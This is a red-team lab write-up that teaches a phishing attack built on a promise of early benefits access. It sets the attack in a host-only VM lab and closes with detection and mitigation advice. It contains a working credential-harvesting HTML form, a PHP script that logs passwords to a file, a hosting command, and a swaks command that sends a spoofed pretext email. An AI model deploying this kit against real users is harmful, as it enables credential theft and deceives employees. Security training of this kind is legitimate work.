## **Law 13 — When Asking for Help, Appeal to Self-Interest**

Interpretation (offensive context):  
People comply faster when the action **benefits them directly**. Align the task with **their gain**, not your need. This reduces resistance and increases engagement.

---

# 🎯 Attack Scenario — _Incentive-Based Credential Harvest (Benefit Framing)_

You frame the interaction as **advantageous to the target** (access, reward, priority), not as a request for help.

**Persona:**

> _Sofia Bennett_, 20 y/o HR Intern

---

# 🔴 Red Team Objective

- Increase:
    
    - **click rate**
        
    - **credential submission rate**
        
- Leverage:
    
    - perceived reward / advantage
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Incentive Design

You define **what the user gains**:

Examples:

- early access
    
- bonus information
    
- internal benefit
    

---

## Phase 2 — Pretext (Self-Interest Trigger)

### Email:

> **Subject:** Early access granted
> 
> “You’ve been given early access to the updated benefits portal before company-wide release.”
> 
> [http://192.168.56.101:8080](http://192.168.56.101:8080/)

👉 No pressure  
👉 Only advantage

---

## Phase 3 — Payload (Aligned with Benefit)

Landing page:

```html
<form action="capture.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Access Benefits</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Delivery

```bash
swaks --to target@corp.local \
--from sofia.b@corp.local \
--server 192.168.56.101 \
--data "Subject: Early access granted

You’ve been given early access to the updated benefits portal before company-wide release:

http://192.168.56.101:8080"
```

---

## Phase 6 — Execution

Target:

- perceives benefit
    
- acts voluntarily
    
- submits credentials
    

👉 No coercion → high compliance

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Reciprocity** (you “give” access)
    
- **Incentive alignment**
    
- **Motivation-based manipulation**
    

Key principle:

> People act faster for themselves than for others

---

# 🛡️ Detection & Defensive Insight

Indicators:

- “exclusive access” messaging
    
- unexpected benefit notifications
    
- login prompts tied to rewards
    

Mitigation:

- user training:
    
    - “If benefit is unexpected → verify source”
        
- enforce:
    
    - official announcements via trusted channels only
        
- monitor:
    
    - unusual access attempts after such emails
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Incentive-Based Social Engineering

### Include:

- incentive-based email sample
    
- phishing interface
    
- captured credentials
    
- analysis:
    
    - why self-interest increases success
        
- impact:
    
    - high engagement attack vector
        

---

# ⚠️ Operator Insight

Requests:

- create friction
    

Benefits:

- create momentum
    

You don’t ask the user to act  
You **give them a reason to act**

---

